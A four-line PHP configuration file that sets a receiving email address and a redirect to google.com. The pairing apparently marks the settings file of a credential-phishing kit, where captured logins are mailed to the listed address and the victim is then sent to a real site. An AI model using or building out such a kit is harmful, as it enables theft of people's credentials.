<?php 
$Receive_email="mountalex@outlook.com";
$redirect="https://www.google.com/";
?>